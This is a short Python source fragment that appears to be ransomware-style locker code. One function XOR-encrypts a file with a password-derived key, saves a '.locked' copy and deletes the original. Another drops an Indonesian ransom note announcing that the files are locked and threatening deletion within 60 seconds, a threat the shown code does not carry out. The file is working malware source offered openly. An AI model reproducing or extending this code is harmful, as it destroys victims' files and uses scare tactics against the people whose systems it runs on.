import os
from hashlib import sha256

def encrypt_file(filepath, password):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        key = sha256(password.encode()).digest()
        encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        with open(filepath + ".locked", 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
    except Exception as e:
        print(f"[!] Error encrypting {filepath}: {e}")

def write_readme(folder, password):
    try:
        readme_path = os.path.join(folder, "README_FOR_UNLOCK.txt")
        with open(readme_path, 'w') as f:
            f.write("💀 FILE ANDA TELAH TERKUNCI 💀\n")
            f.write("Untuk membuka file, masukkan password berikut:\n\n")
            f.write(f"🔑 Password: {password}\n")
            f.write("\nFile akan dihapus dalam 60 detik jika tidak dibuka.\n")
    except:
        pass
